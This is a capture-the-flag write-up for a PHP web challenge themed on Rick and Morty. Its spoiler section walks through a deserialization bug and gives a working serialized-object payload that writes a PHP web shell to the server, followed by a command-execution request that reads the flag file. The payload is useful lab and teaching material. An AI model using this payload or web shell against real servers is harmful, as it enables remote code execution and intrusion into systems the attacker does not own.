# Morty in the Clink

**Category**: web

**Author**: kotsios

## Description

If you want something with your heart, then the Univese will give it to you. In the meantime, can you help Morty to escape from the jail?

<details>
<summary>Reveal Spoiler</summary>
# PHP Deserialization

### Phase 1 - Find the Backup file and the "universe hint":
The student has to enumerate the application and find the "backup.php" file
The "backup.php" is the same application with another one link in the menu section - "s3r1al1z3.php"

**Hint 1: "s3r1al1z3.php" - It indicates the vulnerability is a php deserialization.**

**Hint 2: The content of the main site changed from:**
"The universe is basically an animal. It grazes on the ordinary. It creates infinite idiots just to eat them." - Rick 

To:
"The universe is basically a good hint. It leeds to escape. It creates files to idiot's servers just to hack them." - Rick
 
### Phase 2 - Find the "univese.txt" and the malicious parameter:
Content of the "univese.txt"
```php
<?php
class File
{
  public $filename = 'flag.txt';
  public $content = 'Try harder';
  public function __destruct()
  {
    file_put_contents($this->filename,$this->content);
  }
}
//$o = unserialize($_GET['uxxxxxxe']);
?>
```

From the last line of the script is the last hint.

**Hint 3: The GET parameter for the php deserialization is "universe"**

### Phase 3 - Exploitation
Using the "universe.txt" write a script that upload a malicious file.

I wrote the "deserialise.php" which serialize the malicous "simple_shell.php"

### Uploading the "simple_shell.php" in the webserver.
http://192.168.125.11:5052/s3r1al1z3.php?universe=O:4:%22File%22:2:{s:8:%22filename%22;s:16:%22simple_shell.php%22;s:7:%22content%22;s:35:%22%3C?php%20echo%20system($_GET[%27cmd%27]);%20?%3E%22;}

### Retrieve the flag
http://192.168.125.11:5052/simple_shell.php?cmd=cat%20/home/flag.txt


</details>
